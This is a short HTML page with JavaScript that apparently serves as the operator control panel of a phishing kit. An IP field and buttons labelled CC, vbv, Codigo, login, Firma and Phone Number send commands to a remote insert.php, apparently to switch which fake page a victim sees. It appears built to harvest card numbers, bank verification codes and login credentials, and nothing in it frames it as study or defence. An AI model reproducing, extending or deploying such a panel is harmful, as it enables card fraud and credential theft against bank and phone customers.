<html>
<head>
<script type="text/javascript">
function Myfunction0()
{
    var ip=document.getElementById("ip").value;
	
    window.location.replace(ip+"/insert.php?id=codigo");
  
  
}
function Myfunction1()
{
    var ip=document.getElementById("ip").value;
	
    window.location.replace(ip+"/insert.php?id=error");
  
  
}
function Myfunction6()
{
    var ip=document.getElementById("ip").value;
	
    window.location.replace(ip+"/insert.php?id=vbv");
  
  
}
function Myfunction2()
{
    var ip=document.getElementById("ip").value;
	
    window.location.replace(ip+"/insert.php?id=login");
  
  
}

function Myfunction3()
{
    var ip=document.getElementById("ip").value;
    window.location.replace(ip+"/insert.php?id=finish");
  
  
}
function Myfunction4()
{
    var ip=document.getElementById("ip").value;
    window.location.replace(ip+"/insert.php?id=samsung");
  
  
}
function Myfunction5()
{
    var ip=document.getElementById("ip").value;
    window.location.replace(ip+"/insert.php?id=apple");
  
  
}
</script>
</head>
<body>
   ip: <input type="text" name="ip" id="ip">
   <button onclick="Myfunction0()">Codigo1</button>
   <button onclick="Myfunction4()">Firma</button>
   	<button onclick="Myfunction5()">Phone Number</button>
   <button onclick="Myfunction6()">CC</button>
	<button onclick="Myfunction1()">Codigo extra</button>
	<button onclick="Myfunction2()">login</button>
	<button onclick="Myfunction3()">terminer</button>
</body>
</html>